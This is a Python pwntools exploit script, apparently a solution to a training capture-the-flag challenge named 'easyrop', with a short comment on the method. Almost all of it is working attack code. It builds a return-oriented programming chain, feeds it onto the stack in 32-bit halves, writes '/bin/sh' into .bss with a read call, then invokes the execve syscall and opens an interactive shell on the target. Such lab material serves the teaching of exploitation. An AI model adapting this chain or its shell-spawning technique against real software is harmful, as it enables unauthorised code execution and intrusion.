from pwn import *
from sys import *

SERVER = "bin.training.offdef.it"
PORT = "2015"
BINARY = "./easyrop"


if "--remote" in sys.argv:
    r = remote(SERVER, PORT)
else:
    r = process(BINARY)

if "--debug" in sys.argv: 
    gdb.attach(r, """
        #breakpoints
        #b* 0x40020b
        b* 0x40028b
        c
        """)
    input("wait")


#code

pop_rdi_rsi_rdx_rax_ret = 0x004001c2
binsh_addr = 0x600500
read_addr = 0x400144
syscall_addr = 0x00400168

chain = [0x0]*7
chain += [
    pop_rdi_rsi_rdx_rax_ret, 
    0, 
    binsh_addr, 
    0x100,
    0, 
    read_addr,
    pop_rdi_rsi_rdx_rax_ret, 
    binsh_addr, 
    0, 
    0, 
    0x3b, 
    syscall_addr
]

def send_halfstack(value): 
    r.send(p32(value))
    sleep(0.1)
    r.send(p32(0))

def load_stack(value):
    first_half = value & 0xffffffff
    second_half = value >> 32

    send_halfstack(first_half)
    send_halfstack(second_half)



def pushchain(chain):
    for i in chain: 
        load_stack(i)


pushchain(chain)

sleep(0.1)
r.send(b'\n')
sleep(0.1)
r.send(b'\n')
sleep(0.1)

r.send(b'/bin/sh\x00')
sleep(4)

r.interactive()

'''
Bacause of the fact you can read two integer each loop we made the functions load_stack, send_halfstack
to manipulated the stack properly and have our chain aligned.The cleaner fills
the registers properly in order to do a read. With the first read setted we can instert /bin/sh 
wherever we want, but we have to be sure that the address is always the same (in this case we put it 
at the half of .bss no PIE and no RELRO). After that we used our cleaner to set up a syscall to bin/sh. 
'''